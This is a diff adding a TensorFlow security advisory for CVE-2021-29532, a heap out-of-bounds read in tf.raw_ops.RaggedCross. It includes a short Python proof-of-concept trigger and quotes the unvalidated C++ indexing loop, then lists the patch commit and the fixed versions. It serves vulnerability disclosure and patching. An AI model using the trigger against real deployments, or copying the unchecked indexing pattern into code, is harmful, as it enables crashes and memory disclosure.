@@ -1,0 +1,73 @@
+<h2>TFSA-2021-021: Heap out of bounds read in <code>RaggedCross</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-29532</p>
+<h3>Impact</h3>
+<p>An attacker can force accesses outside the bounds of heap allocated arrays by
+passing in invalid tensor values to <code>tf.raw_ops.RaggedCross</code>:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>ragged_values = []
+ragged_row_splits = []
+sparse_indices = []
+sparse_values = []
+sparse_shape = []</p>
+<p>dense_inputs_elem = tf.constant([], shape=[92, 0], dtype=tf.int64)
+dense_inputs = [dense_inputs_elem]</p>
+<p>input_order = "R"
+hashed_output = False
+num_buckets = 0
+hash_key = 0</p>
+<p>tf.raw_ops.RaggedCross(ragged_values=ragged_values,
+    ragged_row_splits=ragged_row_splits,
+    sparse_indices=sparse_indices,
+    sparse_values=sparse_values,
+    sparse_shape=sparse_shape,
+    dense_inputs=dense_inputs,
+    input_order=input_order,
+    hashed_output=hashed_output,
+    num_buckets=num_buckets,
+    hash_key=hash_key,
+    out_values_type=tf.int64,
+    out_row_splits_type=tf.int64)
+```</p>
+<p>This is because the
+<a href="https://github.com/tensorflow/tensorflow/blob/efea03b38fb8d3b81762237dc85e579cc5fc6e87/tensorflow/core/kernels/ragged_cross_op.cc#L456-L487">implementation</a>
+lacks validation for the user supplied arguments:</p>
+<p><code>cc
+int next_ragged = 0;
+int next_sparse = 0;
+int next_dense = 0;
+for (char c : input_order_) {
+  if (c == 'R') {
+    TF_RETURN_IF_ERROR(BuildRaggedFeatureReader(
+        ragged_values_list[next_ragged], ragged_splits_list[next_ragged],
+        features));
+    next_ragged++;
+  } else if (c == 'S') {
+    TF_RETURN_IF_ERROR(BuildSparseFeatureReader(
+        sparse_indices_list[next_sparse], sparse_values_list[next_sparse],
+        batch_size, features));
+    next_sparse++;
+  } else if (c == 'D') {
+    TF_RETURN_IF_ERROR(
+        BuildDenseFeatureReader(dense_list[next_dense++], features));
+  }
+  ...
+}</code></p>
+<p>Each of the above branches call a helper function after accessing array elements
+via a <code>*_list[next_*]</code> pattern, followed by incrementing the <code>next_*</code> index.
+However, as there is no validation that the <code>next_*</code> values are in the valid
+range for the corresponding <code>*_list</code> arrays, this results in heap OOB reads.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/44b7f486c0143f68b56c34e2d01e146ee445134a">44b7f486c0143f68b56c34e2d01e146ee445134a</a>.</p>
+<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
+commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
+2.1.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.</p>
